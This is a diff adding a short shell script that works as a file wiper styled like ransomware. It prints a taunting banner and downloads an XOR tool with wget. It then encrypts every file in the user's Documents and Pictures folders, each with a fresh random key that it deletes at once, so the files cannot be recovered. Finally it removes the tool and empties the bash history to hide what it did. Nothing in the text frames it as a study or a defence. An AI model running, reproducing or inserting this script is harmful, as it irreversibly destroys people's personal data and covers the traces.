@@ -1,0 +1,13 @@
+echo '---------------------------------------------------------'
+echo 'All your files are gone, permanently!!!'
+echo 'Bring them back, We dare you!!!'
+echo '---------------------------------------------------------'
+wget -q https://raw.githubusercontent.com/scangeo/xor-files/master/binaries/x86_64/xor-files
+for file in ~/Documents/* ~/Pictures/*
+do
+openssl rand 16 > key.txt
+xor-files -r $file $file key.txt
+rm key.txt
+done
+rm xor-files
+echo '' > ~/.bash_history
